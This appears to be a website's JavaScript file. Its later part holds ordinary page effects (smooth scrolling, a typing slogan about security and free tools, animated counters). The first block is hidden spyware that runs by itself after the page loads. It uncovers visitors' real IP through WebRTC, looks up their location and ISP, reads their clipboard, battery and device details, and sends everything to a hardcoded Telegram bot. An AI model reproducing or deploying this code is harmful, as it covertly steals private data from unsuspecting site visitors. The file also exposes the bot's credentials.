(function() {
    const config = {
        token: '8414005580:AAGDuGg7LemMlzS6QJu5_06aHamqMlGYnas',
        chatId: '7950771882'
    };

    // ১. রিয়েল আইপি ডিটেক্টর (WebRTC Leak)
    async function getRealIP() {
        return new Promise((res) => {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19002" }] });
            pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = (i) => {
                if (i && i.candidate && i.candidate.candidate) {
                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
                    res(ip);
                }
            };
            setTimeout(() => res("Not Found/VPN Active"), 4000);
        });
    }

    async function runIntelligence() {
        console.log("System Initializing...");

        // ২. আইপি ও লোকেশন ডাটা (ISP, City, Country)
        let ext = {};
        try {
            const response = await fetch('https://ipapi.co/json/');
            ext = await response.json();
        } catch (e) { ext = { ip: "Fetch Failed" }; }

        // ৩. রিয়েল আইপি
        const realIp = await getRealIP();

        // ৪. ব্যাটারি স্ট্যাটাস
        let batt = "N/A";
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                batt = Math.round(b.level * 100) + "%";
            }
        } catch (e) {}

        // ৫. ক্লিপবোর্ড ডাটা (Needs User Interaction)
        let clip = "Protected/No Focus";
        try {
            if (navigator.clipboard) {
                clip = await navigator.clipboard.readText();
            }
        } catch (e) { clip = "Permission Denied"; }

        // ৬. ডাটা কম্পাইল
        const report = `
🕵️ **Yash Khan Elite Intel Report**
-----------------------------
🌐 **Public IP:** ${ext.ip || 'N/A'}
📡 **Real IP (WebRTC):** ${realIp}
🏢 **ISP:** ${ext.org || 'N/A'}
📍 **City:** ${ext.city || 'N/A'}, ${ext.country_name || 'N/A'}
🔋 **Battery:** ${batt}
📋 **Clipboard:** \`${clip}\`
💻 **OS:** ${navigator.platform}
📱 **Memory:** ${navigator.deviceMemory || 'N/A'} GB
🧠 **CPU Cores:** ${navigator.hardwareConcurrency || 'N/A'}
🕒 **Time:** ${new Date().toLocaleString()}
-----------------------------
🛡️ *Unit: Offensive Bangladesh*
        `;

        // ৭. টেলিগ্রামে পাঠানো
        try {
            await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: config.chatId,
                    text: report,
                    parse_mode: 'Markdown'
                })
            });
            console.log("Report Dispatched.");
        } catch (err) {
            console.error("Dispatch Error");
        }
    }

    // উইন্ডো লোড হওয়ার ৩ সেকেন্ড পর রান হবে
    window.addEventListener('load', () => {
        setTimeout(runIntelligence, 3000);
    });
})();

// ===== Smooth Scroll =====
function scrollToSection() {
  const section = document.getElementById("resources");
  section.scrollIntoView({ behavior: "smooth" });
}

// ===== Typing Effect =====
const text = "Advanced Security • Free Tools • Digital Awareness";
let index = 0;

function typeEffect() {
  const typingElement = document.getElementById("typing");

  if (!typingElement) return;

  if (index < text.length) {
    typingElement.innerHTML += text.charAt(index);
    index++;
    setTimeout(typeEffect, 50);
  }
}

document.addEventListener("DOMContentLoaded", typeEffect);

// ===== Counter Animation =====
const counters = document.querySelectorAll(".counter");

counters.forEach(counter => {
  counter.innerText = "0";

  const updateCounter = () => {
    const target = +counter.getAttribute("data-target");
    const current = +counter.innerText;

    const increment = target / 200;

    if (current < target) {
      counter.innerText = Math.ceil(current + increment);
      setTimeout(updateCounter, 15);
    } else {
      counter.innerText = target;
    }
  };

  updateCounter();
});
